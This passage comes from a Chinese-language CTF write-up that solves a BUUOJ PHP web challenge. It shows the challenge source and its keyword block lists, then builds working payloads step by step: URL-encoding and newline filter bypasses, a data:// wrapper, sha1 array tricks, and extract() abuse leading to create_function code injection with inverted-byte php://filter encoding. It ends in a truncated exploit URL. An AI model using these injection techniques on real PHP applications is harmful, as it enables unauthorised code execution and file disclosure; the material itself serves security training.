Luck!&lt;/B&gt;&lt;br&gt;&lt;/font&gt;&quot;</span>;<br><br><span class="hljs-keyword">if</span>($_SERVER) &#123; <br>    <span class="hljs-keyword">if</span> (<br>        preg_match(&#x27;/shana|<span class="hljs-type">debu</span>|<span class="hljs-type">aqua</span>|<span class="hljs-type">cute</span>|<span class="hljs-type">arg</span>|<span class="hljs-type">code</span>|<span class="hljs-type">flag</span>|<span class="hljs-type">system</span>|<span class="hljs-type">exec</span>|<span class="hljs-type">passwd</span>|<span class="hljs-type">ass</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">sort</span>|<span class="hljs-type">shell</span>|<span class="hljs-type">ob</span>|<span class="hljs-type">start</span>|<span class="hljs-type">mail</span>|<span class="hljs-type">\$|sou</span>|<span class="hljs-type">show</span>|<span class="hljs-type">cont</span>|<span class="hljs-type">high</span>|<span class="hljs-type">reverse</span>|<span class="hljs-type">flip</span>|<span class="hljs-type">rand</span>|<span class="hljs-type">scan</span>|<span class="hljs-type">chr</span>|<span class="hljs-type">local</span>|<span class="hljs-type">sess</span>|<span class="hljs-type">id</span>|<span class="hljs-type">source</span>|<span class="hljs-type">arra</span>|<span class="hljs-type">head</span>|<span class="hljs-type">light</span>|<span class="hljs-type">read</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">info</span>|<span class="hljs-type">bin</span>|<span class="hljs-type">hex</span>|<span class="hljs-type">oct</span>|<span class="hljs-type">echo</span>|<span class="hljs-type">print</span>|<span class="hljs-type">pi</span>|<span class="hljs-type">\.|\&quot;|\&#x27;|log</span>/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])<br>        )  <br>        die(&#x27;You seem to want to <span class="hljs-built_in">do</span> something bad?&#x27;); <br>&#125;<br><br><span class="hljs-keyword">if</span> (!preg_match(&#x27;/http|<span class="hljs-type">https</span>/i&#x27;, $_GET[&#x27;file&#x27;])) &#123;<br>    <span class="hljs-keyword">if</span> (preg_match(&#x27;/^aqua_is_cute$/&#x27;, $_GET[&#x27;debu&#x27;]) &amp;&amp; $_GET[&#x27;debu&#x27;] !== &#x27;aqua_is_cute&#x27;) &#123; <br>        $file = $_GET[<span class="hljs-string">&quot;file&quot;</span>]; <br>        echo <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> die(&#x27;fxck you! What <span class="hljs-built_in">do</span> you want to <span class="hljs-built_in">do</span> ?!&#x27;);<br><br><span class="hljs-keyword">if</span>($_REQUEST) &#123; <br>    foreach($_REQUEST <span class="hljs-built_in">as</span> $value) &#123; <br>        <span class="hljs-keyword">if</span>(preg_match(&#x27;/[a-zA-Z]/i&#x27;, $value))  <br>            die(&#x27;fxck you! I hate English!&#x27;); <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">if</span> (file_get_contents($file) !== &#x27;debu_debu_aqua&#x27;)<br>    die(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> ( sha1($shana) === sha1($passwd) &amp;&amp; $shana != $passwd )&#123;<br>    extract($_GET[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    echo <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    die(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(preg_match(&#x27;/^[a-z0<span class="hljs-number">-9</span>]*$/isD&#x27;, $code) |<span class="hljs-type">| </span><br><span class="hljs-type">preg_match</span>(&#x27;/fil|<span class="hljs-type">cat</span>|<span class="hljs-type">more</span>|<span class="hljs-type">tail</span>|<span class="hljs-type">tac</span>|<span class="hljs-type">less</span>|<span class="hljs-type">head</span>|<span class="hljs-type">nl</span>|<span class="hljs-type">tailf</span>|<span class="hljs-type">ass</span>|<span class="hljs-type">eval</span>|<span class="hljs-type">sort</span>|<span class="hljs-type">shell</span>|<span class="hljs-type">ob</span>|<span class="hljs-type">start</span>|<span class="hljs-type">mail</span>|<span class="hljs-type">\`|\&#123;|\%|x</span>|<span class="hljs-type">\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou</span>|<span class="hljs-type">show</span>|<span class="hljs-type">cont</span>|<span class="hljs-type">high</span>|<span class="hljs-type">reverse</span>|<span class="hljs-type">flip</span>|<span class="hljs-type">rand</span>|<span class="hljs-type">scan</span>|<span class="hljs-type">chr</span>|<span class="hljs-type">local</span>|<span class="hljs-type">sess</span>|<span class="hljs-type">id</span>|<span class="hljs-type">source</span>|<span class="hljs-type">arra</span>|<span class="hljs-type">head</span>|<span class="hljs-type">light</span>|<span class="hljs-type">print</span>|<span class="hljs-type">echo</span>|<span class="hljs-type">read</span>|<span class="hljs-type">inc</span>|<span class="hljs-type">flag</span>|<span class="hljs-type">1f</span>|<span class="hljs-type">info</span>|<span class="hljs-type">bin</span>|<span class="hljs-type">hex</span>|<span class="hljs-type">oct</span>|<span class="hljs-type">pi</span>|<span class="hljs-type">con</span>|<span class="hljs-type">rot</span>|<span class="hljs-type">input</span>|<span class="hljs-type">\.|log</span>|<span class="hljs-type">\^/i</span>&#x27;, $arg) ) &#123; <br>    die(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    include <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    $code(&#x27;&#x27;, $arg); <br>&#125; ?&gt;<br></code></pre></td></tr></table></figure>

<p>大概看一下代码，需要一步步绕过到达最后，利用$code(‘’,$arg)进行create_function注入<br>先绕过第一个if</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">if($_SERVER) &#123; <br>    if (<br>        preg_match(&#x27;/shana|<span class="hljs-string">debu</span>|<span class="hljs-string">aqua</span>|<span class="hljs-string">cute</span>|<span class="hljs-string">arg</span>|<span class="hljs-string">code</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">system</span>|<span class="hljs-string">exec</span>|<span class="hljs-string">passwd</span>|<span class="hljs-string">ass</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">shell</span>|<span class="hljs-string">ob</span>|<span class="hljs-string">start</span>|<span class="hljs-string">mail</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">sou</span>|<span class="hljs-string">show</span>|<span class="hljs-string">cont</span>|<span class="hljs-string">high</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">scan</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">local</span>|<span class="hljs-string">sess</span>|<span class="hljs-string">id</span>|<span class="hljs-string">source</span>|<span class="hljs-string">arra</span>|<span class="hljs-string">head</span>|<span class="hljs-string">light</span>|<span class="hljs-string">read</span>|<span class="hljs-string">inc</span>|<span class="hljs-string">info</span>|<span class="hljs-string">bin</span>|<span class="hljs-string">hex</span>|<span class="hljs-string">oct</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">print</span>|<span class="hljs-string">pi</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">log/i&#x27;, $_SERVER[&#x27;QUERY_STRING&#x27;])</span><br><span class="hljs-string">        )  </span><br><span class="hljs-string">        die(&#x27;You seem to want to do something bad?&#x27;); </span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>
<p>这里介绍了$_SERVER的四个变量<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_49480008/article/details/115872899">传送门</a><br>$_SERVER[‘QUERY_STRING’]表示输入的变量以及值<br>本地测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$shana</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shana&#x27;</span>];<br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$s</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is &quot;</span>.<span class="hljs-variable">$shana</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is &quot;</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;this is &quot;</span>.<span class="hljs-variable">$s</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-variable">$queryString</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$queryString</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-comment">//shana=123&amp;passwd=456  s=789</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/292EE94F8AAC4fa2ADB3C7DD388E7913.png" srcset="/img/loading.gif" lazyload><br>将GET修改一下，进行url编码</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">?shana<span class="hljs-operator">=</span><span class="hljs-number">123</span>&amp;passwd<span class="hljs-operator">=</span><span class="hljs-variable">%34</span><span class="hljs-variable">%35</span><span class="hljs-variable">%36</span>  s<span class="hljs-operator">=</span><span class="hljs-variable">%37</span><span class="hljs-variable">%38</span><span class="hljs-variable">%39</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/92817E054B1F4c78BAD7A5F06DF8926F.png" srcset="/img/loading.gif" lazyload><br>发现GET传参的时候会对get传的参数进行url编码，但是$_SERVER[‘QUERY_STRING’]却不会。<br>所以说对于第一个if的所有字母和字符，都可以用url编码进行绕过</p>
<p>再看第二个if</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>) &#123; <br>        <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>]; <br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Neeeeee! Good Job!&lt;br&gt;&quot;</span>;<br>    &#125; <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br></code></pre></td></tr></table></figure>

<p>先看第二个if<br>^$表示匹配首尾<br>由于preg_match这个函数是只能匹配一行的数据，所以我们可以用%0a(换行符)来绕过<br>这是因为$会忽略换行符<br>payload</p>
<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">?<span class="hljs-keyword">file</span>=<span class="hljs-number">1</span>&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a<br></code></pre></td></tr></table></figure>
<p>这里因为debu被第一个if过滤，所以url编码绕过一下</p>
<p>再来看第三个if</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125;<br></code></pre></td></tr></table></figure>
<p>$_REQUEST在同时接收GET和POST参数时，POST优先级更高</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$shana</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shana&#x27;</span>];<br><span class="hljs-variable">$passwd</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br><span class="hljs-variable">$s</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;shana is &quot;</span>.<span class="hljs-variable">$shana</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;passwd is &quot;</span>.<span class="hljs-variable">$passwd</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;s is &quot;</span>.<span class="hljs-variable">$s</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><br><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Key: &quot;</span> . <span class="hljs-variable">$key</span> . <span class="hljs-string">&quot;, Value: &quot;</span> . <span class="hljs-variable">$value</span> . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//GET输入?shana=123&amp;passwd=456</span><br><span class="hljs-comment">//POST输入s=789&amp;shana=fake1&amp;passwd=fake2</span><br><br></code></pre></td></tr></table></figure>

<p><img src="/images/17B04C7BA45F4021832B0F1174DE707C.png" srcset="/img/loading.gif" lazyload><br>对于这个if</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span><br><span class="hljs-attribute">debu</span>=<span class="hljs-number">1</span>&amp;file=<span class="hljs-number">2</span><br><br></code></pre></td></tr></table></figure>

<p>再看第四个if</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> <span class="hljs-comment">(file_get_contents($file)</span> !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    die<span class="hljs-comment">(&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;)</span>;<br></code></pre></td></tr></table></figure>

<p>用data伪协议绕过data:&#x2F;&#x2F;text&#x2F;plain,debu_debu_aqua</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">file<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><br></code></pre></td></tr></table></figure>

<p>第五个if</p>
<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">if ( sha1(<span class="hljs-string">$s</span>hana) === sha1(<span class="hljs-string">$p</span>asswd) &amp;&amp; <span class="hljs-string">$s</span>hana != <span class="hljs-string">$p</span>asswd )&#123;<br>    extract(<span class="hljs-string">$_</span>GET[<span class="hljs-comment">&quot;flag&quot;</span>]);<br>    echo <span class="hljs-comment">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; else&#123;<br>    die(<span class="hljs-comment">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>sha1()函数无法处理数组，shana和passwd都是数组时都是false<code>$shana[]=1&amp;passwd[]=2</code><br>第一个if把shana和passwd过滤了，url编码绕过(GET传参时GET里面参数的[]和连接变量的&amp;还有给变量赋值的&#x3D;编码后GET传参时不会被解码)</p>
<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">73</span><span class="hljs-meta">%</span><span class="hljs-number">68</span><span class="hljs-meta">%</span><span class="hljs-number">61</span><span class="hljs-meta">%</span><span class="hljs-number">6</span>e<span class="hljs-meta">%</span><span class="hljs-number">61</span>[]=<span class="hljs-number">1</span>&amp;<span class="hljs-meta">%</span><span class="hljs-number">70</span><span class="hljs-meta">%</span><span class="hljs-number">61</span><span class="hljs-meta">%</span><span class="hljs-number">73</span><span class="hljs-meta">%</span><span class="hljs-number">73</span><span class="hljs-meta">%</span><span class="hljs-number">77</span><span class="hljs-meta">%</span><span class="hljs-number">64</span>[]=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure>

<p>最后一个if</p>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">if(preg_match(&#x27;/^[a-z0-9]<span class="hljs-symbol">*</span>$/isD&#x27;, $code) ||<span class="hljs-string"> </span><br><span class="hljs-string">preg_match(&#x27;/fil</span>|<span class="hljs-string">cat</span>|<span class="hljs-string">more</span>|<span class="hljs-string">tail</span>|<span class="hljs-string">tac</span>|<span class="hljs-string">less</span>|<span class="hljs-string">head</span>|<span class="hljs-string">nl</span>|<span class="hljs-string">tailf</span>|<span class="hljs-string">ass</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">sort</span>|<span class="hljs-string">shell</span>|<span class="hljs-string">ob</span>|<span class="hljs-string">start</span>|<span class="hljs-string">mail</span>|<span class="hljs-string">\`</span>|<span class="hljs-string">\&#123;</span>|<span class="hljs-string">\%</span>|<span class="hljs-string">x</span>|<span class="hljs-string">\&amp;</span>|<span class="hljs-string">\$</span>|<span class="hljs-string">\*</span>|<span class="hljs-string">\</span>||<span class="hljs-string">\&lt;</span>|<span class="hljs-string">\&quot;</span>|<span class="hljs-string">\&#x27;</span>|<span class="hljs-string">\=</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">sou</span>|<span class="hljs-string">show</span>|<span class="hljs-string">cont</span>|<span class="hljs-string">high</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">scan</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">local</span>|<span class="hljs-string">sess</span>|<span class="hljs-string">id</span>|<span class="hljs-string">source</span>|<span class="hljs-string">arra</span>|<span class="hljs-string">head</span>|<span class="hljs-string">light</span>|<span class="hljs-string">print</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">read</span>|<span class="hljs-string">inc</span>|<span class="hljs-string">flag</span>|<span class="hljs-string">1f</span>|<span class="hljs-string">info</span>|<span class="hljs-string">bin</span>|<span class="hljs-string">hex</span>|<span class="hljs-string">oct</span>|<span class="hljs-string">pi</span>|<span class="hljs-string">con</span>|<span class="hljs-string">rot</span>|<span class="hljs-string">input</span>|<span class="hljs-string">\.</span>|<span class="hljs-string">log</span>|<span class="hljs-string">\^/i&#x27;, $arg) ) &#123; </span><br><span class="hljs-string">    die(&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;); </span><br><span class="hljs-string">&#125; else &#123; </span><br><span class="hljs-string">    include &quot;flag.php&quot;;</span><br><span class="hljs-string">    $code(&#x27;&#x27;, $arg); </span><br><span class="hljs-string">&#125;</span><br></code></pre></td></tr></table></figure>

<p>看回前面</p>
<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$file = <span class="hljs-string">&quot;1nD3x.php&quot;</span><span class="hljs-comment">;</span><br>$shana = $_GET[<span class="hljs-string">&#x27;shana&#x27;</span>]<span class="hljs-comment">;</span><br>$passwd = $_GET[<span class="hljs-string">&#x27;passwd&#x27;</span>]<span class="hljs-comment">;</span><br>$arg = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">;</span><br>$code = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
<p>code与arg的值都为空值，正常情况下是不能修改它们的值的，但由于第五个if中的extract()函数，我们就可以对开头处的两个变量进行操控<br>本地测试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$arg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$code</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;arg= &#x27;</span>.<span class="hljs-variable">$arg</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;code= &#x27;</span>.<span class="hljs-variable">$code</span>.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/D9436627026B4cc08D8BB09D35FF18C3.png" srcset="/img/loading.gif" lazyload><br>因为$code和$arg可控，利用$code(‘’,$arg)进行<a target="_blank" rel="noopener" href="https://blog.csdn.net/while0/article/details/72276440">create_function注入</a><br>$arg&#x3D;}代码;&#x2F;&#x2F;,则}闭合了函数，同时&#x2F;&#x2F;注释了后面的内容<br>构造flag[code]&#x3D;create_function&amp;flag[arg]&#x3D;}var_dump(get_defined_vars());&#x2F;&#x2F;</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span>[<span class="hljs-variable">%63</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span>]<span class="hljs-operator">=</span>create_function&amp;<span class="hljs-variable">%66</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%67</span>[<span class="hljs-variable">%61</span><span class="hljs-variable">%72</span><span class="hljs-variable">%67</span>]<span class="hljs-operator">=</span>&#125;var_dump(get_defined_vars())<span class="hljs-comment">;//</span><br></code></pre></td></tr></table></figure>
<p><img src="/images/65286D129FD94939A53D534FF5A2900E.png" srcset="/img/loading.gif" lazyload><br>发现最后</p>
<figure class="highlight smalltalk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">[<span class="hljs-comment">&quot;ffffffff11111114ggggg&quot;</span>]=&gt; string(<span class="hljs-number">89</span>) <span class="hljs-comment">&quot;Baka, do you think it&#x27;s so easy to get my flag? I hid the real flag in rea1fl4g.php 23333&quot;</span> &#125;<br></code></pre></td></tr></table></figure>
<p>由于第最后一个if处过滤了read所以在这里取反绕过一下</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> urlencode<span class="hljs-params">(~&#x27;php://filter/<span class="hljs-attr">read</span>=convert.base64-encode/<span class="hljs-attr">resource</span>=rea1fl4g.php&#x27;)</span>;<br></code></pre></td></tr></table></figure>
<p>用require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))<br>替换刚才的var_dump(get_defined_vars())被编码的部分即可。</p>
<p>最终的代码</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-symbol">http:</span>//<span class="hljs-number">23</span>ae<span class="hljs-number">7090</span>-b<span class="hljs-number">51</span>b<span class="hljs-number">-4e0</span>b<span class="hljs-number">-921</span>f<span class="hljs-number">-964</span>eaf<span class="hljs-number">520e03</span>.node<span class="hljs-number">5</span>.buuoj.cn:<span class="hljs-number">81</span>/<span class="hljs-number">1</span>nD<span class="hljs-number">3</span><span class="hljs-keyword">x</span>.php?file<span class="hljs-operator">=</span><span class="hljs-variable">%64</span><span class="hljs-variable">%61</span><span class="hljs-variable">%74</span><span class="hljs-variable">%61</span><span class="hljs-variable">%3</span>a<span class="hljs-variable">%2</span>f<span class="hljs-variable">%2</span>f<span class="hljs-variable">%74</span><span class="hljs-variable">%65</span><span class="hljs-variable">%78</span><span class="hljs-variable">%74</span><span class="hljs-variable">%2</span>f<span class="hljs-variable">%70</span><span class="hljs-variable">%6</span><span class="hljs-keyword">c</span><span class="hljs-variable">%61</span><span class="hljs-variable">%69</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%2</span><span class="hljs-keyword">c</span><span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span>&amp;<span class="hljs-variable">%64</span><span class="hljs-variable">%65</span><span class="hljs-variable">%62</span><span class="hljs-variable">%75</span><span class="hljs-operator">=</span><span class="hljs-variable">%61</span><span class="hljs-variable">%71</span><span class="hljs-variable">%75</span><span class="hljs-variable">%61</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%69</span><span class="hljs-variable">%73</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%63</span><span class="hljs-variable">%75</span><span 